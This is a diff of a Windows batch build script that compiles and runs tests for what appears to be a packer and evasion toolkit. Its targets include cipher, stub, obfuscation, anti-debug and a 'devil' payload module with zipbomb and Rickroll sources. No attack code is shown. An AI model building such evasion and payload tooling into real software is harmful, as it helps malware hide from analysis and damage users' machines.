@@ -12,17 +12,17 @@ set RESOURCES_OBJ=resources.o
 
 :: Executable names
 set CIPHER=cipher.exe
-set COMPUTER=computer.exe
+set SYS_ENV=system_env.exe
 set STUB=stub.exe
 set PACKING=packing.exe
 set COMPRESSOR=compressor.exe
 SET COMPOSE=compose.exe
 set FAKE_REC=fake_rec.exe
-set PROCESSOR_ARCHITECTURE=processor_architecture.exe
-set TMP_PATH=tmp_path.exe
 set SHA=sha.exe
 set CALL=call_printf.exe
 set DEVIL=devil.exe
+set ANTI_DEBUG=anti_debug.exe
+set CUSTOM=custom.exe
 
 :: Check first argument
 if "%1"=="clean" goto clean
@@ -39,7 +39,7 @@ if "%1"=="test" goto test_single
 if "%1"=="" goto tests_all
 
 echo Usage: build.bat [test [TEST_NAME]^|tests^|resources^|clean]
-echo Available tests: CIPHER, COMPUTER, STUB, PACKING, COMPRESSOR, COMPOSE, FAKE_REC, CALL, DEVIL
+echo Available tests: CIPHER, SYS_ENV, STUB, PACKING, COMPRESSOR, COMPOSE, FAKE_REC, CALL, DEVIL, ANTI_DEBUG, CUSTOM
 echo.
 echo Commands:
 echo   build.bat                - Compile and run all tests
@@ -74,7 +74,7 @@ goto end
 set TEST_NAME=%2
 if "%TEST_NAME%"=="" (
     echo ERROR: Please specify a test name
-    echo Available tests: CIPHER, COMPUTER, STUB, PACKING, COMPRESSOR
+    echo Available tests: CIPHER, SYS_ENV, STUB, PACKING, COMPRESSOR
     goto error
 )
 
@@ -105,7 +105,7 @@ echo.
 call :compile_CIPHER
 if errorlevel 1 goto error
 
-call :compile_COMPUTER
+call :compile_SYS_ENV
 if errorlevel 1 goto error
 
 call :compile_STUB
@@ -123,11 +123,7 @@ if errorlevel 1 goto error
 call :compile_FAKE_REC
 if errorlevel 1 goto error
 
-call :compile_PROCESSOR_ARCHITECTURE
-if errorlevel 1 goto error
 
-call :compile_TMP_PATH
-if errorlevel 1 goto error
 
 call :compile_SHA
 if errorlevel 1 goto error
@@ -138,6 +134,12 @@ if errorlevel 1 goto error
 call :compile_DEVIL
 if errorlevel 1 goto error
 
+call :compile_ANTI_DEBUG
+if errorlevel 1 goto error
+
+call :compile_CUSTOM
+if errorlevel 1 goto error
+
 echo.
 echo ********************************************
 echo *          Running tests...                *
@@ -145,17 +147,17 @@ echo ********************************************
 echo.
 
 call :run_CIPHER
-call :run_COMPUTER
+call :run_SYS_ENV
 call :run_STUB
 call :run_PACKING
 call :run_COMPRESSOR
 call :run_COMPOSE
 call :run_FAKE_REC
-call :run_PROCESSOR_ARCHITECTURE
-call :run_TMP_PATH
 call :run_SHA
 call :run_CALL
 call :run_DEVIL
+call :run_ANTI_DEBUG
+call :run_CUSTOM
 
 
 echo.
@@ -171,10 +173,10 @@ echo Compiling %CIPHER%...
 %CXX% -o %CIPHER% packer/Cipher.cpp env/SystemEnvironment.cpp tests/TestingTools.cpp tests/test_cipher.cpp %RESOURCES_OBJ% %CXXFLAGS%
 exit /b %errorlevel%
 
-:compile_COMPUTER
-echo Compiling %COMPUTER%...
-%CXX% -o %COMPUTER% packer/ComputerName.cpp tests/TestingTools.cpp tests/test_computer_name.cpp  %CXXFLAGS%
-%CXX% -o %COMPUTER% packer/ComputerName.cpp tests/TestingTools.cpp tests/test_computer_name.cpp %RESOURCES_OBJ% %CXXFLAGS%
+:compile_SYS_ENV
+echo Compiling %SYS_ENV%...
+%CXX% -o %SYS_ENV% env/SystemEnvironment.cpp tests/TestingTools.cpp tests/test_sys_env.cpp  %CXXFLAGS%
+%CXX% -o %SYS_ENV% env/SystemEnvironment.cpp tests/TestingTools.cpp tests/test_sys_env.cpp %RESOURCES_OBJ% %CXXFLAGS%
 exit /b %errorlevel%
 
 :compile_STUB
@@ -207,16 +209,7 @@ echo Compiling %FAKE_REC%...
 %CXX% -o %FAKE_REC% obfuscation_methods/fake_rec.cpp tests/TestingTools.cpp tests/test_fake_rec.cpp %RESOURCES_OBJ% %CXXFLAGS%
 exit /b %errorlevel%
 
-:compile_PROCESSOR_ARCHITECTURE
-echo Compiling %PROCESSOR_ARCHITECTURE%...
-%CXX% -o %PROCESSOR_ARCHITECTURE% env/SystemEnvironment.cpp tests/TestingTools.cpp tests/test_processor_architecture.cpp %RESOURCES_OBJ% %CXXFLAGS%
-exit /b %errorlevel%
 
-:compile_TMP_PATH
-echo Compiling %TMP_PATH%...
-%CXX% -o %TMP_PATH% env/SystemEnvironment.cpp tests/TestingTools.cpp tests/test_temp_path.cpp  %CXXFLAGS%
-%CXX% -o %TMP_PATH% env/SystemEnvironment.cpp tests/TestingTools.cpp tests/test_temp_path.cpp %RESOURCES_OBJ% %CXXFLAGS%
-exit /b %errorlevel%
 
 :compile_SHA
 echo Compiling %SHA%...
@@ -225,14 +218,25 @@ exit /b %errorlevel%
 
 
 :compile_CALL
-echo Compiling %TMP_PATH%...
+echo Compiling %CALL%...
 %CXX% -o %CALL% obfuscation_methods/LoadPrintfFunction.cpp env/SystemEnvironment.cpp packer/Cipher.cpp tests/TestingTools.cpp tests/test_call_printf.cpp  %CXXFLAGS%
 %CXX% -o %CALL% obfuscation_methods/LoadPrintfFunction.cpp env/SystemEnvironment.cpp packer/Cipher.cpp tests/TestingTools.cpp tests/test_call_printf.cpp %RESOURCES_OBJ% %CXXFLAGS%
 exit /b %errorlevel%
 
 :compile_DEVIL
 echo Compiling %DEVIL%...
+%CXX% -o %DEVIL% devil/DevilCode.cpp devil/Rickroll.cpp devil/zipbomb.cpp packer/Compressor.cpp tests/TestingTools.cpp tests/test_devil_code.cpp -lwinmm %CXXFLAGS%
 %CXX% -o %DEVIL% devil/DevilCode.cpp devil/Rickroll.cpp devil/zipbomb.cpp packer/Compressor.cpp tests/TestingTools.cpp tests/test_devil_code.cpp -lwinmm %RESOURCES_OBJ% %CXXFLAGS%
+exit /b %errorlevel%
+
+:compile_ANTI_DEBUG
+echo Compiling %ANTI_DEBUG%...
+%CXX% -o %ANTI_DEBUG% tests/test_anti_debug.cpp -lpsapi %CXXFLAGS%
+exit /b %errorlevel%
+
+:compile_CUSTOM
+echo Compiling %CUSTOM%...
+%CXX% -o %CUSTOM% tests/test_custom.cpp devil/custom.cpp env/SystemEnvironment.cpp packer/Cipher.cpp crypto/hash.cpp obfuscation_methods/anti_debug/anti_debug.cpp -lpsapi %CXXFLAGS% %RESOURCES_OBJ%
 exit /b %errorlevel%
 
 :: Run functions
@@ -242,9 +246,9 @@ echo *** Test Cipher ***
 echo.
 exit /b 0
 
-:run_COMPUTER
-echo *** Test Computer Name ***
-%COMPUTER%
+:run_SYS_ENV
+echo *** Testing System Environment namespace ***
+%SYS_ENV%
 echo.
 exit /b 0
 
@@ -278,17 +282,7 @@ echo *** Test Fake rec ***
 echo.
 exit /b 0
 
-:run_PROCESSOR_ARCHITECTURE
-echo *** Test Processor Architecture ***
-%PROCESSOR_ARCHITECTURE%
-echo.
-exit /b 0
 
-:run_TMP_PATH
-echo *** Test temp path ***
-%TMP_PATH%
-echo.
-exit /b 0
 
 :run_SHA
 echo *** Test sha function ***
@@ -308,21 +302,34 @@ echo *** Test devil ***
 echo.
 exit /b 0
 
+:run_ANTI_DEBUG
+echo *** Test Anti-Debug ***
+%ANTI_DEBUG%
+echo.
+exit /b 0
+
+:run_CUSTOM
+echo *** Test Custom Function ***
+%CUSTOM%
+echo.
+exit /b 0
+
 
 :clean
 echo Cleaning executables...
 if exist %CIPHER% del %CIPHER%
-if exist %COMPUTER% del %COMPUTER%
+if exist %SYS_ENV% del %SYS_ENV%
 if exist %STUB% del %STUB%
 if exist %PACKING% del %PACKING%
 if exist %COMPRESSOR% del %COMPRESSOR%
 if exist %COMPOSE% del %COMPOSE%
 if exist %FAKE_REC% del %FAKE_REC%
-if exist %PROCESSOR_ARCHITECTURE% del %PROCESSOR_ARCHITECTURE%
-if exist %TMP_PATH% del %TMP_PATH%
 if exist %SHA% del %SHA%
 if exist %CALL% del %CALL%
 if exist %DEVIL% del %DEVIL%
+if exist %ANTI_DEBUG% del %ANTI_DEBUG%
+if exist %CUSTOM% del %CUSTOM%
+
 if exist %RESOURCES_OBJ% del %RESOURCES_OBJ%
 echo Cleaning completed.
 goto end
